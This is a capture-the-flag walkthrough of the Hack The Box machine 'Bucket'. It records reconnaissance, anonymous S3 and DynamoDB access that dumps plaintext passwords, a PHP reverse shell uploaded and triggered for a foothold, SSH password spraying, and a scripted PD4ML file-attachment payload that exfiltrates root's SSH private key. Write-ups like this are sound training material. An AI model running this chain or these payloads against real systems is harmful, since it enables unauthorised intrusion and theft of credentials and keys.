# 05 - Loot

## Credentials

- SSH:`roy:n2vM-<_K_Q:.Aa2`

## Emails

- support@bucket.htb

## Usernames

- Mgmt
- Cloudadm
- Sysadm
- roy

## Passwords

- Management@#1@#
- Welcome123!
- n2vM-<_K_Q:.Aa2

# 10 - Reconnaissance

## Nmap

`nmap` shows 2 open ports: 22 (SSH) and 80 (HTTP)

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ cat nmap/10-initial-bucket.nmap 

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 22 12:19:46 2021 -- 1 IP address (1 host up) scanned in 11.09 seconds
```

Scanning through all ports return the same.

# 15 - Enumeration

## TCP 80 - bucket.htb (Website)

Visiting this port via browser redirects to `http://bucket.htb/`

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ curl -s http://10.10.10.212
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="http://bucket.htb/">here</a>.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 10.10.10.212 Port 80</address>
</body></html>
```

Add to `bucket.htb` to `/etc/hosts`

```text
10.10.10.212    bucket.htb
```

### Web Pages

index.html

![image-20210422234425022](_resources/image-20210422234425022.png)

### Gobuster

Nothing interesting

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ gobuster dir -u http://bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-M-80
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bucket.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,bak,html
[+] Timeout:                 10s
===============================================================
2021/04/22 12:45:56 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 5344]
/server-status        (Status: 403) [Size: 275] 
```

### Page Source

A vhost discovered in page source.

![image-20210422234754897](_resources/image-20210422234754897.png)

/etc/hosts

```text
10.10.10.212    bucket.htb s3.bucket.htb
```

## TCP 80 - s3.bucket.htb

![image-20210422235335494](_resources/image-20210422235335494.png)

![image-20210422235427604](_resources/image-20210422235427604.png)

### Gobuster 

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ gobuster dir -u http://s3.bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-vhost-M-80
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://s3.bucket.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,bak,html
[+] Timeout:                 10s
===============================================================
2021/04/22 12:56:43 Starting gobuster in directory enumeration mode
===============================================================
/shell                (Status: 200) [Size: 0]
/health               (Status: 200) [Size: 54]
/server-status        (Status: 403) [Size: 275] 
```

### /shell

http://444af250749d:4566/shell/

![image-20210424222707480](_resources/image-20210424222707480.png)

```bash
→ root@iamf «~» «10.10.14.51» 
$ curl -sv http://s3.bucket.htb/shell

...<snip>...
< refresh: 0; url=http://444af250749d:4566/shell/
< access-control-allow-origin: *
< access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
< access-control-allow-headers: authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging
< access-control-expose-headers: x-amz-version-id
< 
* Connection #0 to host s3.bucket.htb left intact
```

![image-20210424222916709](_resources/image-20210424222916709.png)

I added it to `/etc/hosts` but it still doesn't resolve.

```text
10.10.10.212    bucket.htb s3.bucket.htb 444af250749d
```

Adding another `/` in the end resolve to this page.

![image-20210424223257481](_resources/image-20210424223257481.png)

### /health

![image-20210422235825937](_resources/image-20210422235825937.png)

## AWS S3

S3 stands for Simple Storage Service. It is a storage service offered by Amazon.

Installation guide:

- https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install

Usage commands:

- https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html#using-s3-commands-listing-buckets

Usage in general

```
→ root@iamf «bucket» «10.10.14.39» 
$ aws s3

usage: aws [options] s3 <subcommand> [parameters]
```

### Bucket Enumeration 

Listing S3 bucket. 

> A *bucket* is a container for objects stored in Amazon *S3* 

```bash
$ aws s3 ls --endpoint-url=http://s3.bucket.htb 
2020-10-21 09:16:03 adserver
```

Listing objects in adserver bucket.

```bash
$ aws s3 ls s3://adserver --endpoint-url=http://s3.bucket.htb
                           PRE images/
2020-10-21 09:22:04       5344 index.html
$ aws s3 ls s3://adserver/images/ --endpoint-url=http://s3.bucket.htb
2020-10-21 09:52:04      37840 bug.jpg
2020-10-21 09:52:04      51485 cloud.png
2020-10-21 09:52:04      16486 malware.png
```

These all the files used in `bucket.htb`

### S3 File Upload 

The subcommand `cp` allows to copy a file (objects) from local to a bucket or vice versa ([source](https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html#using-s3-commands-managing-objects-copy)). 

```bash
aws s3 cp <source> <target> [--options]
```

Download test (bucket --> local)

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 cp s3://adserver/images/cloud.png . --endpoint-url=http://s3.bucket.htb
download: s3://adserver/images/cloud.png to ./cloud.png           
→ root@iamf «bucket» «10.10.14.39» 
$ ls -l
total 72
-rw-r--r-- 1 root root 51485 Apr 22 13:29 cloud.png
```

Upload test (local --> bucket) and confirm it with the subcommand `ls`.

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ touch iamf-test
→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 cp iamf-test s3://adserver/ --endpoint-url=http://s3.bucket.htb 
upload: ./iamf-test to s3://adserver/iamf-test
→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 ls s3://adserver/ --endpoint-url=http://s3.bucket.htb
                           PRE images/
2021-04-22 13:31:13          0 iamf-test
2021-04-22 13:31:04       5344 index.html
```

Determine the location of the uploaded file.

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ echo '<?php echo "IamF" ?>' > iamf-test.php
→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url=http://s3.bucket.htb
upload: ./iamf-test.php to s3://adserver/iamf-test.php            
→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 ls s3://adserver/ --endpoint-url=http://s3.bucket.htb 
                           PRE images/
2021-04-22 14:05:15         21 iamf-test.php
2021-04-22 14:05:04       5344 index.html
```

The file is available at `http://s3.bucket.htb/adserver/iamf-test.php` and `http://bucket.htb/iamf-test.php` but the execution happens on `bucket.htb`. Non default files are get deleted in a few minutes.

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ curl -s http://s3.bucket.htb/adserver/iamf-test.php
<?php echo "IamF" ?>
→ root@iamf «bucket» «10.10.14.39» 
$ curl -s http://bucket.htb/iamf-test.php
IamF
```

![image-20210423010636324](_resources/image-20210423010636324.png)



## AWS DynamoDB

DynamoDB is a NoSQL database developed by Amazon

General usage:

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ aws dynamodb 
usage: aws [options] <command> <subcommand> [<subcommand> ...] [parameters]
```

### Enumeration

List tables in current DB.

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
You must specify a region. You can also configure your region by running "aws configure".
```

Configure

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ aws configure
AWS Access Key ID [None]:
AWS Secret Access Key [None]:
Default region name [None]: us-east-1
Default output format [None]:
```

Anonymous user is allowed to list database tables.

```bash
$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
{
    "TableNames": [
        "users"
    ]
}
```

Obtain content of users table with the subcommand `scan`.

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb
{
    "Items": [
        {
            "password": {
                "S": "Management@#1@#"
            },
            "username": {
                "S": "Mgmt"
            }
        },
        {
            "password": {
                "S": "Welcome123!"
            },
            "username": {
                "S": "Cloudadm"
            }
        },
        {
            "password": {
                "S": "n2vM-<_K_Q:.Aa2"
            },
            "username": {
                "S": "Sysadm"
            }
        }
    ],
    "Count": 3,
    "ScannedCount": 3,
    "ConsumedCapacity": null
}
```

### Create table 

Anonymous user is allowed to create a table.

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ aws dynamodb create-table --cli-input-json file://test-tables.json --endpoint-url  http://s3.bucket.htb
{
    "TableDescription": {
        "AttributeDefinitions": [
            {
                "AttributeName": "Name",
                "AttributeType": "S"
            }
        ],
        "TableName": "iamf",
        "KeySchema": [
            {
                "AttributeName": "Name",
                "KeyType": "HASH"
            }
        ],
        "TableStatus": "ACTIVE",
        "CreationDateTime": "2021-04-22T15:22:33.634000-04:00",
        "ProvisionedThroughput": {
            "LastIncreaseDateTime": "1969-12-31T19:00:00-05:00",
            "LastDecreaseDateTime": "1969-12-31T19:00:00-05:00",
            "NumberOfDecreasesToday": 0,
            "ReadCapacityUnits": 10,
            "WriteCapacityUnits": 5
        },
        "TableSizeBytes": 0,
        "ItemCount": 0,
        "TableArn": "arn:aws:dynamodb:us-east-1:000000000000:table/iamf"
    }
}
```

Confirms with `list-tables`

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
{
    "TableNames": [
        "iamf",
        "users"
    ]
}
```

Structure

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ aws dynamodb scan --table-name iamf --endpoint-url http://s3.bucket.htb                 
{
    "Items": [],
    "Count": 0,
    "ScannedCount": 0,
    "ConsumedCapacity": null
}
```

Reference https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/getting-started-step-1.html

## SSH Bruteforce (None)

None of those credentials are work.

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ crackmapexec ssh 10.10.10.212 -u usernames.list -p passwords.list
SSH         10.10.10.212    22     10.10.10.212     [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
SSH         10.10.10.212    22     10.10.10.212     [-] Mgmt:Management@#1@# Authentication failed.
SSH         10.10.10.212    22     10.10.10.212     [-] Mgmt:Welcome123! Authentication failed.
SSH         10.10.10.212    22     10.10.10.212     [-] Mgmt:n2vM-<_K_Q:.Aa2 Authentication failed.
SSH         10.10.10.212    22     10.10.10.212     [-] Cloudadm:Management@#1@# Authentication failed.
SSH         10.10.10.212    22     10.10.10.212     [-] Cloudadm:Welcome123! Authentication failed.
SSH         10.10.10.212    22     10.10.10.212     [-] Cloudadm:n2vM-<_K_Q:.Aa2Authentication failed.
SSH         10.10.10.212    22     10.10.10.212     [-] Sysadm:Management@#1@# Authentication failed.
SSH         10.10.10.212    22     10.10.10.212     [-] Sysadm:Welcome123! Authentication failed.
SSH         10.10.10.212    22     10.10.10.212     [-] Sysadm:n2vM-<_K_Q:.Aa2 Authentication failed.
```



# 20 - Foothold

## Reverse Shell via S3 File Upload

Upload reverse shell

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 cp ./iamf.php s3://adserver/ --endpoint-url=http://s3.bucket.htb; 
```

Trigger it via curl

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ curl -s http://bucket.htb/iamf.php
```

Wait for a few minutes or reupload the shell if it doesn't return.

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ rlwrap nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.39] from (UNKNOWN) [10.10.10.212] 58352
Linux bucket 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 18:14:02 up 13:18,  0 users,  load average: 0.03, 0.04, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1050): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bucket:/$ 
```

![image-20210423011428675](_resources/image-20210423011428675.png)



# 25 - Privilege Escalation

## Internal enumeration

User with shells

```bash
www-data@bucket:/$ cat /etc/passwd | grep sh$
cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
roy:x:1000:1000:,,,:/home/roy:/bin/bash
www-data@bucket:/$ 
```

Can't do anything here.

```bash
www-data@bucket:/var/www$ ls -la /home/roy
ls -la /home/roy
total 44
drwxr-xr-x 7 roy  roy  4096 Apr 22 12:03 .
drwxr-xr-x 3 root root 4096 Sep 16  2020 ..
drwxrwxr-x 2 roy  roy  4096 Apr 22 12:03 .aws
lrwxrwxrwx 1 roy  roy     9 Sep 16  2020 .bash_history -> /dev/null
-rw-r--r-- 1 roy  roy   220 Sep 16  2020 .bash_logout
-rw-r--r-- 1 roy  roy  3771 Sep 16  2020 .bashrc
drwx------ 2 roy  roy  4096 Apr 22 07:57 .cache
drwx------ 4 roy  roy  4096 Apr 22 08:01 .gnupg
-rw-r--r-- 1 roy  roy   807 Sep 16  2020 .profile
drwxr-xr-x 3 roy  roy  4096 Apr 22 07:59 project
drwxr-xr-x 3 roy  roy  4096 Apr 22 07:59 snap
-r-------- 1 roy  roy    33 Apr 22 04:56 user.txt
www-data@bucket:/home/roy$ cd ~
cd ~
www-data@bucket:/var/www$ ls -la
ls -la
total 16
drwxr-xr-x   4 root root 4096 Feb 10 12:29 .
drwxr-xr-x  14 root root 4096 Feb 10 12:29 ..
drwxr-x---+  4 root root 4096 Feb 10 12:29 bucket-app
drwxr-xr-x   2 root root 4096 Apr 22 18:27 html
www-data@bucket:/var/www$ 
```



## Password Spraying on roy

One of the password works on `roy`.

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ crackmapexec ssh '10.10.10.212' -u roy -p passwords.list
SSH         10.10.10.212    22     10.10.10.212     [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
SSH         10.10.10.212    22     10.10.10.212     [-] roy:Management@#1@# Authentication failed.
SSH         10.10.10.212    22     10.10.10.212     [-] roy:Welcome123! Authentication failed.
SSH         10.10.10.212    22     10.10.10.212     [+] roy:n2vM-<_K_Q:.Aa2 
```



## SSH access as roy

SSH access using `roy` account.

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ ssh roy@10.10.10.212
roy@10.10.10.212's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 22 Apr 2021 06:37:59 PM UTC

  System load:                      0.02
  Usage of /:                       33.8% of 17.59GB
  Memory usage:                     29%
  Swap usage:                       0%
  Processes:                        252
  Users logged in:                  0
  IPv4 address for br-bee97070fb20: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.212
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:df48

...<snip>...

Last login: Thu Apr 22 11:47:58 2021 from 10.10.14.35
roy@bucket:~$ id
uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm)
roy@bucket:~$ 
```

User flag

![image-20210423013951765](_resources/image-20210423013951765.png)

### Enumeration

Interesting WinPEAS

```bash
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                                 
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                     
tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:46275         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 

[+] Readable files belonging to root and readable by me but not world readable
-rwxr-x---+ 1 root root 808729 Jun 10  2020 /var/www/bucket-app/pd4ml_demo.jar                                 
-rw-r-x---+ 1 root root 358 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/README.md
-rw-r-x---+ 1 root root 1085 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/LICENSE
-rw-r-x---+ 1 root root 4689 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/src/UploadedFileInterface.php
-rw-r-x---+ 1 root root 4746 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/src/StreamInterface.php

════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
[+] SUID - Check easy privesc, exploits and write perms                                                         
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid   

-rwsr-xr-x 1 root   root            146K Jan 31  2020 /snap/core18/1885/usr/bin/sudo
  --- It looks like /snap/core18/1885/usr/bin/sudo is using /proc/self/stat and you can modify it (strings line: /proc/self/stat) (https://tinyurl.com/suidpath)
```

Web config

```bash
roy@bucket:~$ cat /etc/apache2/sites-available/000-default.conf 
<VirtualHost 127.0.0.1:8000> # unknown
        <IfModule mpm_itk_module>
                AssignUserId root root
        </IfModule>
        DocumentRoot /var/www/bucket-app
</VirtualHost>

<VirtualHost *:80> # bucket.htb
        DocumentRoot /var/www/html
        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^bucket.htb$
        RewriteRule /.* http://bucket.htb/ [R]
</VirtualHost>
<VirtualHost *:80> # s3.bucket.htb 

        ProxyPreserveHost on
        ProxyPass / http://localhost:4566/
        ProxyPassReverse / http://localhost:4566/
        <Proxy *>
                 Order deny,allow
                 Allow from all
         </Proxy>
        ServerAdmin webmaster@localhost
        ServerName s3.bucket.htb

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

Web directory

```bash
roy@bucket:/var/www/bucket-app$ ls -la
total 856
drwxr-x---+  4 root root   4096 Feb 10 12:29 .
drwxr-xr-x   4 root root   4096 Feb 10 12:29 ..
-rw-r-x---+  1 root root     63 Sep 23  2020 composer.json
-rw-r-x---+  1 root root  20533 Sep 23  2020 composer.lock
drwxr-x---+  2 root root   4096 Apr 22 12:38 files
-rwxr-x---+  1 root root  17222 Sep 23  2020 index.php
-rwxr-x---+  1 root root 808729 Jun 10  2020 pd4ml_demo.jar
drwxr-x---+ 10 root root   4096 Feb 10 12:29 vendor
```

### Internal Web 

Tunneling

```bash
roy@bucket:/var/www/bucket-app$ ~C
ssh> -L 8000:127.0.0.1:8000
Forwarding port.
```

![image-20210423015905604](_resources/image-20210423015905604.png)



### Code Review

Index.php breakdown

```bash
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: index.php
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?php
   2   │ require 'vendor/autoload.php';
   3   │ use Aws\DynamoDb\DynamoDbClient;
   4   │ if($_SERVER["REQUEST_METHOD"]==="POST") {
   5   │     if($_POST["action"]==="get_alerts") {
   6   │         date_default_timezone_set('America/New_York');
   7   │         $client = new DynamoDbClient([
   8   │             'profile' => 'default',
   9   │             'region'  => 'us-east-1',
  10   │             'version' => 'latest',
  11   │             'endpoint' => 'http://localhost:4566'
  12   │         ]);
  13   │
  14   │         $iterator = $client->getIterator('Scan', array(
  15   │             'TableName' => 'alerts',
  16   │             'FilterExpression' => "title = :title",
  17   │             'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
  18   │         ));
  19   │
  20   │         foreach ($iterator as $item) {
  21   │             $name=rand(1,10000).'.html';
  22   │             file_put_contents('files/'.$name,$item["data"]);
  23   │         }
  24   │         passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-ap
       │ p/files/$name 800 A4 -out files/result.pdf");
  25   │     }
  26   │ }
```

Interesting line

```php
...<snip>...
             passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
        }
...<snip>...
```

## Obtain root SSH key

### Preparation

Wrap it up:

- Anonymous user is allowed to create a table
- Based on the apache config, the internal web is assigned to `root`.
- $item["data"] is controlled by us.

The automatic clean up scripts and the endless aws subcommand really annoys me, I'll make some preparation and get it scripted. `alerts-table.json`

```bash
{
        "TableName": "alerts",
        "AttributeDefinitions":
        [
                {"AttributeName": "title", "AttributeType" : "S"},
                {"AttributeName": "data", "AttributeType" : "S"}
        ],
        "KeySchema":
        [
                {"AttributeName": "title", "KeyType" : "HASH"},
                {"AttributeName": "data", "KeyType" : "RANGE"}
        ],
        "ProvisionedThroughput" :
        {"WriteCapacityUnits": 5, "ReadCapacityUnits": 10}
}
```

`insert.json`, the payload.

```json
{
	"title": 
    {"S": "Ransomware"},
    "data": 
    {"S": "<pd4ml:attachment>file:///root/.ssh/id_rsa</pd4ml:attachment>"}
}
```

`getroot.sh`

```bash
#!/bin/bash

aws dynamodb create-table --cli-input-json file://alerts-table.json --endpoint-url=http://s3.bucket.htb >/dev/null
sleep 0.5
aws dynamodb put-item --table-name alerts --item file://insert.json --endpoint-url=http://s3.bucket.htb >/dev/null
sleep 0.5
curl -svd "action=get_alerts" http://127.0.0.1:8000/ 
```

### Exploitation

On roy shell at Bucket:

```bash
roy@bucket:/var/www/bucket-app/files$ while sleep 1; do sed -n '/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p' * 2>/dev/null; done
```

Run script `getroot.sh`

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ ./getroot.sh                                      
[+] Create table
[+] Insert item
[+] Send get alerts
*   Trying 127.0.0.1:8000...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 8000 (#0)
> POST / HTTP/1.1
> Host: 127.0.0.1:8000
> User-Agent: curl/7.66.0
> Accept: */*
> Content-Length: 17
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 17 out of 17 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Thu, 22 Apr 2021 20:04:14 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host 127.0.0.1 left intact
```

on roy shell:

```bash
roy@bucket:/var/www/bucket-app/files$ while sleep 1; do sed -n '/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p' * 2>/dev/null; done

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...<snip>...
-----END OPENSSH PRIVATE KEY-----
```

![image-20210425032310617](_resources/image-20210425032310617.png)

Login as root using the obtained SSH key.

```bash
→ root@iamf «bucket» «10.10.14.39» 
$ ssh -i root_rsa 10.10.10.212
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 22 Apr 2021 08:07:44 PM UTC

  System load:                      0.05
  Usage of /:                       33.9% of 17.59GB
  Memory usage:                     27%
  Swap usage:                       0%
  Processes:                        258
  Users logged in:                  1
  IPv4 address for br-bee97070fb20: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.212
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:df48


229 updates can be installed immediately.
103 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Apr 22 20:07:25 2021 from 10.10.14.39
root@bucket:~# id;hostname;cut -c-15 root.txt 
uid=0(root) gid=0(root) groups=0(root)
bucket
efc73dd09ceb705
```

![image-20210423030829929](_resources/image-20210423030829929.png)